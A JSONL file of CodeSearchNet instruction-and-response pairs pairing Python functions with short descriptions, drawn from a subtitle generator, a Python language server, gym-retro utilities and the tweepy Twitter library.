{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nextracts audio from an input file to a temporary WAV file.", "response": "def extract_audio(filename, channels=1, rate=16000):\n    \"\"\"\n    Extract audio from an input file to a temporary WAV file.\n    \"\"\"\n    temp = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)\n    if not os.path.isfile(filename):\n        print(\"The given file does not exist: {}\".format(filename))\n        raise Exception(\"Invalid filepath: {}\".format(filename))\n    if not which(\"ffmpeg\"):\n        print(\"ffmpeg: Executable not found on machine.\")\n        raise Exception(\"Dependency not found: ffmpeg\")\n    command = [\"ffmpeg\", \"-y\", \"-i\", filename,\n               \"-ac\", str(channels), \"-ar\", str(rate),\n               \"-loglevel\", \"error\", temp.name]\n    use_shell = True if os.name == \"nt\" else False\n    subprocess.check_output(command, stdin=open(os.devnull), shell=use_shell)\n    return temp.name, rate"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfinds the audio file s audio files and return a list of the audio files that are within the specified range.", "response": "def find_speech_regions(filename, frame_width=4096, min_region_size=0.5, max_region_size=6): # pylint: disable=too-many-locals\n    \"\"\"\n    Perform voice activity detection on a given audio file.\n    \"\"\"\n    reader = wave.open(filename)\n    sample_width = reader.getsampwidth()\n    rate = reader.getframerate()\n    n_channels = reader.getnchannels()\n    chunk_duration = float(frame_width) / rate\n\n    n_chunks = int(math.ceil(reader.getnframes()*1.0 / frame_width))\n    energies = []\n\n    for _ in range(n_chunks):\n        chunk = reader.readframes(frame_width)\n        energies.append(audioop.rms(chunk, sample_width * n_channels))\n\n    threshold = percentile(energies, 0.2)\n\n    elapsed_time = 0\n\n    regions = []\n    region_start = None\n\n    for energy in energies:\n        is_silence = energy <= threshold\n        max_exceeded = region_start and elapsed_time - region_start >= max_region_size\n\n        if (max_exceeded or is_silence) and region_start:\n            if elapsed_time - region_start >= min_region_size:\n                regions.append((region_start, elapsed_time))\n                region_start = None\n\n        elif (not region_start) and (not is_silence):\n            region_start = elapsed_time\n        elapsed_time += chunk_duration\n    return regions"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef generate_subtitles( # pylint: disable=too-many-locals,too-many-arguments\n        source_path,\n        output=None,\n        concurrency=DEFAULT_CONCURRENCY,\n        src_language=DEFAULT_SRC_LANGUAGE,\n        dst_language=DEFAULT_DST_LANGUAGE,\n        subtitle_file_format=DEFAULT_SUBTITLE_FORMAT,\n        api_key=None,\n    ):\n    \"\"\"\n    Given an input audio/video file, generate subtitles in the specified language and format.\n    \"\"\"\n    audio_filename, audio_rate = extract_audio(source_path)\n\n    regions = find_speech_regions(audio_filename)\n\n    pool = multiprocessing.Pool(concurrency)\n    converter = FLACConverter(source_path=audio_filename)\n    recognizer = SpeechRecognizer(language=src_language, rate=audio_rate,\n                                  api_key=GOOGLE_SPEECH_API_KEY)\n\n    transcripts = []\n    if regions:\n        try:\n            widgets = [\"Converting speech regions to FLAC files: \", Percentage(), ' ', Bar(), ' ',\n                       ETA()]\n            pbar = ProgressBar(widgets=widgets, maxval=len(regions)).start()\n            extracted_regions = []\n            for i, extracted_region in enumerate(pool.imap(converter, regions)):\n                extracted_regions.append(extracted_region)\n                pbar.update(i)\n            pbar.finish()\n\n            widgets = [\"Performing speech recognition: \", Percentage(), ' ', Bar(), ' ', ETA()]\n            pbar = ProgressBar(widgets=widgets, maxval=len(regions)).start()\n\n            for i, transcript in enumerate(pool.imap(recognizer, extracted_regions)):\n                transcripts.append(transcript)\n                pbar.update(i)\n            pbar.finish()\n\n            if src_language.split(\"-\")[0] != dst_language.split(\"-\")[0]:\n                if api_key:\n                    google_translate_api_key = api_key\n                    translator = Translator(dst_language, google_translate_api_key,\n                                            dst=dst_language,\n                                            src=src_language)\n                    prompt = \"Translating from {0} to {1}: \".format(src_language, dst_language)\n                    widgets = [prompt, Percentage(), ' ', Bar(), ' ', ETA()]\n                    pbar = ProgressBar(widgets=widgets, maxval=len(regions)).start()\n                    translated_transcripts = []\n                    for i, transcript in enumerate(pool.imap(translator, transcripts)):\n                        translated_transcripts.append(transcript)\n                        pbar.update(i)\n                    pbar.finish()\n                    transcripts = translated_transcripts\n                else:\n                    print(\n                        \"Error: Subtitle translation requires specified Google Translate API key. \"\n                        \"See --help for further information.\"\n                    )\n                    return 1\n\n        except KeyboardInterrupt:\n            pbar.finish()\n            pool.terminate()\n            pool.join()\n            print(\"Cancelling transcription\")\n            raise\n\n    timed_subtitles = [(r, t) for r, t in zip(regions, transcripts) if t]\n    formatter = FORMATTERS.get(subtitle_file_format)\n    formatted_subtitles = formatter(timed_subtitles)\n\n    dest = output\n\n    if not dest:\n        base = os.path.splitext(source_path)[0]\n        dest = \"{base}.{format}\".format(base=base, format=subtitle_file_format)\n\n    with open(dest, 'wb') as output_file:\n        output_file.write(formatted_subtitles.encode(\"utf-8\"))\n\n    os.remove(audio_filename)\n\n    return dest", "response": "Generate subtitles from audio files."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nchecking that the CLI arguments passed to autosub are valid.", "response": "def validate(args):\n    \"\"\"\n    Check that the CLI arguments passed to autosub are valid.\n    \"\"\"\n    if args.format not in FORMATTERS:\n        print(\n            \"Subtitle format not supported. \"\n            \"Run with --list-formats to see all supported formats.\"\n        )\n        return False\n\n    if args.src_language not in LANGUAGE_CODES.keys():\n        print(\n            \"Source language not supported. \"\n            \"Run with --list-languages to see all supported languages.\"\n        )\n        return False\n\n    if args.dst_language not in LANGUAGE_CODES.keys():\n        print(\n            \"Destination language not supported. \"\n            \"Run with --list-languages to see all supported languages.\"\n        )\n        return False\n\n    if not args.source_path:\n        print(\"Error: You need to specify a source path.\")\n        return False\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nruns autosub as a command - line program.", "response": "def main():\n    \"\"\"\n    Run autosub as a command-line program.\n    \"\"\"\n    parser = argparse.ArgumentParser()\n    parser.add_argument('source_path', help=\"Path to the video or audio file to subtitle\",\n                        nargs='?')\n    parser.add_argument('-C', '--concurrency', help=\"Number of concurrent API requests to make\",\n                        type=int, default=DEFAULT_CONCURRENCY)\n    parser.add_argument('-o', '--output',\n                        help=\"Output path for subtitles (by default, subtitles are saved in \\\n                        the same directory and name as the source path)\")\n    parser.add_argument('-F', '--format', help=\"Destination subtitle format\",\n                        default=DEFAULT_SUBTITLE_FORMAT)\n    parser.add_argument('-S', '--src-language', help=\"Language spoken in source file\",\n                        default=DEFAULT_SRC_LANGUAGE)\n    parser.add_argument('-D', '--dst-language', help=\"Desired language for the subtitles\",\n                        default=DEFAULT_DST_LANGUAGE)\n    parser.add_argument('-K', '--api-key',\n                        help=\"The Google Translate API key to be used. \\\n                        (Required for subtitle translation)\")\n    parser.add_argument('--list-formats', help=\"List all available subtitle formats\",\n                        action='store_true')\n    parser.add_argument('--list-languages', help=\"List all available source/destination languages\",\n                        action='store_true')\n\n    args = parser.parse_args()\n\n    if args.list_formats:\n        print(\"List of formats:\")\n        for subtitle_format in FORMATTERS:\n            print(\"{format}\".format(format=subtitle_format))\n        return 0\n\n    if args.list_languages:\n        print(\"List of all languages:\")\n        for code, language in sorted(LANGUAGE_CODES.items()):\n            print(\"{code}\\t{language}\".format(code=code, language=language))\n        return 0\n\n    if not validate(args):\n        return 1\n\n    try:\n        subtitle_file_path = generate_subtitles(\n            source_path=args.source_path,\n            concurrency=args.concurrency,\n            src_language=args.src_language,\n            dst_language=args.dst_language,\n            api_key=args.api_key,\n            subtitle_file_format=args.format,\n            output=args.output,\n        )\n        print(\"Subtitles file created at {}\".format(subtitle_file_path))\n    except KeyboardInterrupt:\n        return 1\n\n    return 0"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _sort_text(definition):\n\n    # If its 'hidden', put it next last\n    prefix = 'z{}' if definition.name.startswith('_') else 'a{}'\n    return prefix.format(definition.name)", "response": "Sort the text of a node in order to be used in the tree."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a dictionary containing user and plugin settings and project settings.", "response": "def settings(self, document_path=None):\n        \"\"\"Settings are constructed from a few sources:\n\n            1. User settings, found in user's home directory\n            2. Plugin settings, reported by PyLS plugins\n            3. LSP settings, given to us from didChangeConfiguration\n            4. Project settings, found in config files in the current project.\n\n        Since this function is nondeterministic, it is important to call\n        settings.cache_clear() when the config is updated\n        \"\"\"\n        settings = {}\n        sources = self._settings.get('configurationSources', DEFAULT_CONFIG_SOURCES)\n\n        for source_name in reversed(sources):\n            source = self._config_sources.get(source_name)\n            if not source:\n                continue\n            source_conf = source.user_config()\n            log.debug(\"Got user config from %s: %s\", source.__class__.__name__, source_conf)\n            settings = _utils.merge_dicts(settings, source_conf)\n        log.debug(\"With user configuration: %s\", settings)\n\n        settings = _utils.merge_dicts(settings, self._plugin_settings)\n        log.debug(\"With plugin configuration: %s\", settings)\n\n        settings = _utils.merge_dicts(settings, self._settings)\n        log.debug(\"With lsp configuration: %s\", settings)\n\n        for source_name in reversed(sources):\n            source = self._config_sources.get(source_name)\n            if not source:\n                continue\n            source_conf = source.project_config(document_path or self._root_path)\n            log.debug(\"Got project config from %s: %s\", source.__class__.__name__, source_conf)\n            settings = _utils.merge_dicts(settings, source_conf)\n        log.debug(\"With project configuration: %s\", settings)\n\n        return settings"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, settings):\n        self.settings.cache_clear()\n        self._settings = settings\n        log.info(\"Updated settings to %s\", self._settings)\n        self._update_disabled_plugins()", "response": "Recursively merge the given settings into the current settings."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a managed document if - present else create one pointing at disk.", "response": "def get_document(self, doc_uri):\n        \"\"\"Return a managed document if-present, else create one pointing at disk.\n\n        See https://github.com/Microsoft/language-server-protocol/issues/177\n        \"\"\"\n        return self._docs.get(doc_uri) or self._create_document(doc_uri)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef source_roots(self, document_path):\n        files = _utils.find_parents(self._root_path, document_path, ['setup.py']) or []\n        return [os.path.dirname(setup_py) for setup_py in files]", "response": "Return the source roots for the given document."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\napplying a change to the document.", "response": "def apply_change(self, change):\n        \"\"\"Apply a change to the document.\"\"\"\n        text = change['text']\n        change_range = change.get('range')\n\n        if not change_range:\n            # The whole file has changed\n            self._source = text\n            return\n\n        start_line = change_range['start']['line']\n        start_col = change_range['start']['character']\n        end_line = change_range['end']['line']\n        end_col = change_range['end']['character']\n\n        # Check for an edit occuring at the very end of the file\n        if start_line == len(self.lines):\n            self._source = self.source + text\n            return\n\n        new = io.StringIO()\n\n        # Iterate over the existing document until we hit the edit range,\n        # at which point we write the new text, then loop until we hit\n        # the end of the range and continue writing.\n        for i, line in enumerate(self.lines):\n            if i < start_line:\n                new.write(line)\n                continue\n\n            if i > end_line:\n                new.write(line)\n                continue\n\n            if i == start_line:\n                new.write(line[:start_col])\n                new.write(text)\n\n            if i == end_line:\n                new.write(line[end_col:])\n\n        self._source = new.getvalue()"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the word under the cursor returning the start and end positions.", "response": "def word_at_position(self, position):\n        \"\"\"Get the word under the cursor returning the start and end positions.\"\"\"\n        if position['line'] >= len(self.lines):\n            return ''\n\n        line = self.lines[position['line']]\n        i = position['character']\n        # Split word in two\n        start = line[:i]\n        end = line[i:]\n\n        # Take end of start and start of end to find word\n        # These are guaranteed to match, even if they match the empty string\n        m_start = RE_START_WORD.findall(start)\n        m_end = RE_END_WORD.findall(end)\n\n        return m_start[0] + m_end[-1]"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef debounce(interval_s, keyed_by=None):\n    def wrapper(func):\n        timers = {}\n        lock = threading.Lock()\n\n        @functools.wraps(func)\n        def debounced(*args, **kwargs):\n            call_args = inspect.getcallargs(func, *args, **kwargs)\n            key = call_args[keyed_by] if keyed_by else None\n\n            def run():\n                with lock:\n                    del timers[key]\n                return func(*args, **kwargs)\n\n            with lock:\n                old_timer = timers.get(key)\n                if old_timer:\n                    old_timer.cancel()\n\n                timer = threading.Timer(interval_s, run)\n                timers[key] = timer\n                timer.start()\n        return debounced\n    return wrapper", "response": "Decorator that can be used to debounce calls to this function until interval_s seconds have passed."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef find_parents(root, path, names):\n    if not root:\n        return []\n\n    if not os.path.commonprefix((root, path)):\n        log.warning(\"Path %s not in %s\", path, root)\n        return []\n\n    # Split the relative by directory, generate all the parent directories, then check each of them.\n    # This avoids running a loop that has different base-cases for unix/windows\n    # e.g. /a/b and /a/b/c/d/e.py -> ['/a/b', 'c', 'd']\n    dirs = [root] + os.path.relpath(os.path.dirname(path), root).split(os.path.sep)\n\n    # Search each of /a/b/c, /a/b, /a\n    while dirs:\n        search_dir = os.path.join(*dirs)\n        existing = list(filter(os.path.exists, [os.path.join(search_dir, n) for n in names]))\n        if existing:\n            return existing\n        dirs.pop()\n\n    # Otherwise nothing\n    return []", "response": "Find files matching the given names relative to the given path."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef merge_dicts(dict_a, dict_b):\n    def _merge_dicts_(a, b):\n        for key in set(a.keys()).union(b.keys()):\n            if key in a and key in b:\n                if isinstance(a[key], dict) and isinstance(b[key], dict):\n                    yield (key, dict(_merge_dicts_(a[key], b[key])))\n                elif b[key] is not None:\n                    yield (key, b[key])\n                else:\n                    yield (key, a[key])\n            elif key in a:\n                yield (key, a[key])\n            elif b[key] is not None:\n                yield (key, b[key])\n    return dict(_merge_dicts_(dict_a, dict_b))", "response": "Recursively merge dictionary b into dictionary a.\n\n   "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef format_docstring(contents):\n    contents = contents.replace('\\t', u'\\u00A0' * 4)\n    contents = contents.replace('  ', u'\\u00A0' * 2)\n    contents = contents.replace('*', '\\\\*')\n    return contents", "response": "Format a Python docstring into a number of formats."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nparse and decode the parts of a URI.", "response": "def urlparse(uri):\n    \"\"\"Parse and decode the parts of a URI.\"\"\"\n    scheme, netloc, path, params, query, fragment = parse.urlparse(uri)\n    return (\n        parse.unquote(scheme),\n        parse.unquote(netloc),\n        parse.unquote(path),\n        parse.unquote(params),\n        parse.unquote(query),\n        parse.unquote(fragment)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef to_fs_path(uri):\n    # scheme://netloc/path;parameters?query#fragment\n    scheme, netloc, path, _params, _query, _fragment = urlparse(uri)\n\n    if netloc and path and scheme == 'file':\n        # unc path: file://shares/c$/far/boo\n        value = \"//{}{}\".format(netloc, path)\n\n    elif RE_DRIVE_LETTER_PATH.match(path):\n        # windows drive letter: file:///C:/far/boo\n        value = path[1].lower() + path[2:]\n\n    else:\n        # Other path\n        value = path\n\n    if IS_WIN:\n        value = value.replace('/', '\\\\')\n\n    return value", "response": "Returns the filesystem path of the given URI."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef from_fs_path(path):\n    scheme = 'file'\n    params, query, fragment = '', '', ''\n    path, netloc = _normalize_win_path(path)\n    return urlunparse((scheme, netloc, path, params, query, fragment))", "response": "Returns a URI for the given filesystem path."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a new URI with the given part(s ) replaced.", "response": "def uri_with(uri, scheme=None, netloc=None, path=None, params=None, query=None, fragment=None):\n    \"\"\"Return a URI with the given part(s) replaced.\n\n    Parts are decoded / encoded.\n    \"\"\"\n    old_scheme, old_netloc, old_path, old_params, old_query, old_fragment = urlparse(uri)\n    path, _netloc = _normalize_win_path(path)\n    return urlunparse((\n        scheme or old_scheme,\n        netloc or old_netloc,\n        path or old_path,\n        params or old_params,\n        query or old_query,\n        fragment or old_fragment\n    ))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd a new error to the list of diagnostics.", "response": "def flake(self, message):\n        \"\"\" Get message like <filename>:<lineno>: <msg> \"\"\"\n        err_range = {\n            'start': {'line': message.lineno - 1, 'character': message.col},\n            'end': {'line': message.lineno - 1, 'character': len(self.lines[message.lineno - 1])},\n        }\n\n        severity = lsp.DiagnosticSeverity.Warning\n        for message_type in PYFLAKES_ERROR_MESSAGES:\n            if isinstance(message, message_type):\n                severity = lsp.DiagnosticSeverity.Error\n                break\n\n        self.diagnostics.append({\n            'source': 'pyflakes',\n            'range': err_range,\n            'message': message.message % message.message_args,\n            'severity': severity\n        })"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncalling hook_name and returns a list of results from all registered handlers", "response": "def _hook(self, hook_name, doc_uri=None, **kwargs):\n        \"\"\"Calls hook_name and returns a list of results from all registered handlers\"\"\"\n        doc = self.workspace.get_document(doc_uri) if doc_uri else None\n        hook_handlers = self.config.plugin_manager.subset_hook_caller(hook_name, self.config.disabled_plugins)\n        return hook_handlers(config=self.config, workspace=self.workspace, document=doc, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _sort_text(definition):\n    if definition.name.startswith(\"_\"):\n        # It's a 'hidden' func, put it next last\n        return 'z' + definition.name\n    elif definition.scope == 'builtin':\n        return 'y' + definition.name\n\n    # Else put it at the front\n    return 'a' + definition.name", "response": "Sort the text of a resource in order to be used in the tree."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the VSCode type of the given object", "response": "def _kind(d):\n    \"\"\" Return the VSCode type \"\"\"\n    MAP = {\n        'none': lsp.CompletionItemKind.Value,\n        'type': lsp.CompletionItemKind.Class,\n        'tuple': lsp.CompletionItemKind.Class,\n        'dict': lsp.CompletionItemKind.Class,\n        'dictionary': lsp.CompletionItemKind.Class,\n        'function': lsp.CompletionItemKind.Function,\n        'lambda': lsp.CompletionItemKind.Function,\n        'generator': lsp.CompletionItemKind.Function,\n        'class': lsp.CompletionItemKind.Class,\n        'instance': lsp.CompletionItemKind.Reference,\n        'method': lsp.CompletionItemKind.Method,\n        'builtin': lsp.CompletionItemKind.Class,\n        'builtinfunction': lsp.CompletionItemKind.Function,\n        'module': lsp.CompletionItemKind.Module,\n        'file': lsp.CompletionItemKind.File,\n        'xrange': lsp.CompletionItemKind.Class,\n        'slice': lsp.CompletionItemKind.Class,\n        'traceback': lsp.CompletionItemKind.Class,\n        'frame': lsp.CompletionItemKind.Class,\n        'buffer': lsp.CompletionItemKind.Class,\n        'dictproxy': lsp.CompletionItemKind.Class,\n        'funcdef': lsp.CompletionItemKind.Function,\n        'property': lsp.CompletionItemKind.Property,\n        'import': lsp.CompletionItemKind.Module,\n        'keyword': lsp.CompletionItemKind.Keyword,\n        'constant': lsp.CompletionItemKind.Variable,\n        'variable': lsp.CompletionItemKind.Variable,\n        'value': lsp.CompletionItemKind.Value,\n        'param': lsp.CompletionItemKind.Variable,\n        'statement': lsp.CompletionItemKind.Keyword,\n    }\n\n    return MAP.get(d.type)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget an option from a configparser with the given type.", "response": "def _get_opt(config, key, option, opt_type):\n    \"\"\"Get an option from a configparser with the given type.\"\"\"\n    for opt_key in [option, option.replace('-', '_')]:\n        if not config.has_option(key, opt_key):\n            continue\n\n        if opt_type == bool:\n            return config.getbool(key, opt_key)\n\n        if opt_type == int:\n            return config.getint(key, opt_key)\n\n        if opt_type == str:\n            return config.get(key, opt_key)\n\n        if opt_type == list:\n            return _parse_list_opt(config.get(key, opt_key))\n\n        raise ValueError(\"Unknown option type: %s\" % opt_type)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsets the value in the dictionary at the given path.", "response": "def _set_opt(config_dict, path, value):\n    \"\"\"Set the value in the dictionary at the given path if the value is not None.\"\"\"\n    if value is None:\n        return\n\n    if '.' not in path:\n        config_dict[path] = value\n        return\n\n    key, rest = path.split(\".\", 1)\n    if key not in config_dict:\n        config_dict[key] = {}\n\n    _set_opt(config_dict[key], rest, value)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef parse_config(config, key, options):\n        conf = {}\n        for source, destination, opt_type in options:\n            opt_value = _get_opt(config, key, source, opt_type)\n            if opt_value is not None:\n                _set_opt(conf, destination, opt_value)\n        return conf", "response": "Parse the config with the given options."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nconstruct binary stdio streams.", "response": "def _binary_stdio():\n    \"\"\"Construct binary stdio streams (not text mode).\n\n    This seems to be different for Window/Unix Python2/3, so going by:\n        https://stackoverflow.com/questions/2850893/reading-binary-data-from-stdin\n    \"\"\"\n    PY3K = sys.version_info >= (3, 0)\n\n    if PY3K:\n        # pylint: disable=no-member\n        stdin, stdout = sys.stdin.buffer, sys.stdout.buffer\n    else:\n        # Python 2 on Windows opens sys.stdin in text mode, and\n        # binary data that read from it becomes corrupted on \\r\\n\n        if sys.platform == \"win32\":\n            # set sys.stdin to binary mode\n            # pylint: disable=no-member,import-error\n            import os\n            import msvcrt\n            msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY)\n            msvcrt.setmode(sys.stdout.fileno(), os.O_BINARY)\n        stdin, stdout = sys.stdin, sys.stdout\n\n    return stdin, stdout"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nruns the interactive window until the user quits AttributeNames", "response": "def run(self):\n        \"\"\"\n        Run the interactive window until the user quits\n        \"\"\"\n        # pyglet.app.run() has issues like https://bitbucket.org/pyglet/pyglet/issues/199/attempting-to-resize-or-close-pyglet\n        # and also involves inverting your code to run inside the pyglet framework\n        # avoid both by using a while loop\n        prev_frame_time = time.time()\n        while True:\n            self._win.switch_to()\n            self._win.dispatch_events()\n            now = time.time()\n            self._update(now - prev_frame_time)\n            prev_frame_time = now\n            self._draw()\n            self._win.flip()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_file_path(game, file, inttype=Integrations.DEFAULT):\n    base = path()\n    for t in inttype.paths:\n        possible_path = os.path.join(base, t, game, file)\n        if os.path.exists(possible_path):\n            return possible_path\n\n    return None", "response": "Return the path to a given game s directory"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the path to a given game s romfile", "response": "def get_romfile_path(game, inttype=Integrations.DEFAULT):\n    \"\"\"\n    Return the path to a given game's romfile\n    \"\"\"\n    for extension in EMU_EXTENSIONS.keys():\n        possible_path = get_file_path(game, \"rom\" + extension, inttype)\n        if possible_path:\n            return possible_path\n\n    raise FileNotFoundError(\"No romfiles found for game: %s\" % game)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a Gym environment for the specified game", "response": "def make(game, state=State.DEFAULT, inttype=retro.data.Integrations.DEFAULT, **kwargs):\n    \"\"\"\n    Create a Gym environment for the specified game\n    \"\"\"\n    try:\n        retro.data.get_romfile_path(game, inttype)\n    except FileNotFoundError:\n        if not retro.data.get_file_path(game, \"rom.sha\", inttype):\n            raise\n        else:\n            raise FileNotFoundError('Game not found: %s. Did you make sure to import the ROM?' % game)\n    return RetroEnv(game, state, inttype=inttype, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef select_actions(root, action_space, max_episode_steps):\n    node = root\n\n    acts = []\n    steps = 0\n    while steps < max_episode_steps:\n        if node is None:\n            # we've fallen off the explored area of the tree, just select random actions\n            act = action_space.sample()\n        else:\n            epsilon = EXPLORATION_PARAM / np.log(node.visits + 2)\n            if random.random() < epsilon:\n                # random action\n                act = action_space.sample()\n            else:\n                # greedy action\n                act_value = {}\n                for act in range(action_space.n):\n                    if node is not None and act in node.children:\n                        act_value[act] = node.children[act].value\n                    else:\n                        act_value[act] = -np.inf\n                best_value = max(act_value.values())\n                best_acts = [\n                    act for act, value in act_value.items() if value == best_value\n                ]\n                act = random.choice(best_acts)\n\n            if act in node.children:\n                node = node.children[act]\n            else:\n                node = None\n\n        acts.append(act)\n        steps += 1\n\n    return acts", "response": "Select actions from the tree."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nperforms a rollout using a preset collection of actions", "response": "def rollout(env, acts):\n    \"\"\"\n    Perform a rollout using a preset collection of actions\n    \"\"\"\n    total_rew = 0\n    env.reset()\n    steps = 0\n    for act in acts:\n        _obs, rew, done, _info = env.step(act)\n        steps += 1\n        total_rew += rew\n        if done:\n            break\n\n    return steps, total_rew"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update_tree(root, executed_acts, total_rew):\n    root.value = max(total_rew, root.value)\n    root.visits += 1\n    new_nodes = 0\n\n    node = root\n    for step, act in enumerate(executed_acts):\n        if act not in node.children:\n            node.children[act] = Node()\n            new_nodes += 1\n        node = node.children[act]\n        node.value = max(total_rew, node.value)\n        node.visits += 1\n\n    return new_nodes", "response": "Given the tree root and a list of actions that were executed before the game ended and a reward update the tree with the new value."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the authorization URL to redirect the user to", "response": "def get_authorization_url(self,\n                              signin_with_twitter=False,\n                              access_type=None):\n        \"\"\"Get the authorization URL to redirect the user\"\"\"\n        try:\n            if signin_with_twitter:\n                url = self._get_oauth_url('authenticate')\n                if access_type:\n                    logging.warning(WARNING_MESSAGE)\n            else:\n                url = self._get_oauth_url('authorize')\n            self.request_token = self._get_request_token(access_type=access_type)\n            return self.oauth.authorization_url(url)\n        except Exception as e:\n            raise TweepError(e)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the access token and secret for the current user.", "response": "def get_access_token(self, verifier=None):\n        \"\"\"\n        After user has authorized the request token, get access token\n        with user supplied verifier.\n        \"\"\"\n        try:\n            url = self._get_oauth_url('access_token')\n            self.oauth = OAuth1Session(self.consumer_key,\n                                       client_secret=self.consumer_secret,\n                                       resource_owner_key=self.request_token['oauth_token'],\n                                       resource_owner_secret=self.request_token['oauth_token_secret'],\n                                       verifier=verifier, callback_uri=self.callback)\n            resp = self.oauth.fetch_access_token(url)\n            self.access_token = resp['oauth_token']\n            self.access_token_secret = resp['oauth_token_secret']\n            return self.access_token, self.access_token_secret\n        except Exception as e:\n            raise TweepError(e)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget an access token from an username and password combination.", "response": "def get_xauth_access_token(self, username, password):\n        \"\"\"\n        Get an access token from an username and password combination.\n        In order to get this working you need to create an app at\n        http://twitter.com/apps, after that send a mail to api@twitter.com\n        and request activation of xAuth for it.\n        \"\"\"\n        try:\n            url = self._get_oauth_url('access_token')\n            oauth = OAuth1(self.consumer_key,\n                           client_secret=self.consumer_secret)\n            r = requests.post(url=url,\n                              auth=oauth,\n                              headers={'x_auth_mode': 'client_auth',\n                                       'x_auth_username': username,\n                                       'x_auth_password': password})\n\n            credentials = parse_qs(r.content)\n            return credentials.get('oauth_token')[0], credentials.get('oauth_token_secret')[0]\n        except Exception as e:\n            raise TweepError(e)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstore a new record in the cache.", "response": "def store(self, key, value):\n        \"\"\"Add new record to cache\n            key: entry key\n            value: data of entry\n        \"\"\"\n        self.client.set(key, value, time=self.timeout)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nstore the key value pair in our redis server", "response": "def store(self, key, value):\n        \"\"\"Store the key, value pair in our redis server\"\"\"\n        # Prepend tweepy to our key,\n        # this makes it easier to identify tweepy keys in our redis server\n        key = self.pre_identifier + key\n        # Get a pipe (to execute several redis commands in one step)\n        pipe = self.client.pipeline()\n        # Set our values in a redis hash (similar to python dict)\n        pipe.set(key, pickle.dumps((time.time(), value)))\n        # Set the expiration\n        pipe.expire(key, self.timeout)\n        # Add the key to a set containing all the keys\n        pipe.sadd(self.keys_container, key)\n        # Execute the instructions in the redis server\n        pipe.execute()"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngive a key returns an element from the redis table", "response": "def get(self, key, timeout=None):\n        \"\"\"Given a key, returns an element from the redis table\"\"\"\n        key = self.pre_identifier + key\n        # Check to see if we have this key\n        unpickled_entry = self.client.get(key)\n        if not unpickled_entry:\n            # No hit, return nothing\n            return None\n\n        entry = pickle.loads(unpickled_entry)\n        # Use provided timeout in arguments if provided\n        # otherwise use the one provided during init.\n        if timeout is None:\n            timeout = self.timeout\n\n        # Make sure entry is not expired\n        if self._is_expired(entry, timeout):\n            # entry expired, delete and return nothing\n            self.delete_entry(key)\n            return None\n        # entry found and not expired, return it\n        return entry[1]"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef delete_entry(self, key):\n        pipe = self.client.pipeline()\n        pipe.srem(self.keys_container, key)\n        pipe.delete(key)\n        pipe.execute()", "response": "Delete an object from the redis table"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndelete all entries from the cache", "response": "def flush(self):\n        \"\"\"Delete all entries from the cache\"\"\"\n        keys = self.client.smembers(self.keys_container)\n        for key in keys:\n            self.delete_entry(key)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef related_results(self):\n        return bind_api(\n            api=self,\n            path='/related_results/show/{id}.json',\n            payload_type='relation', payload_list=True,\n            allowed_param=['id'],\n            require_auth=False\n        )", "response": "bind to twitter api"}
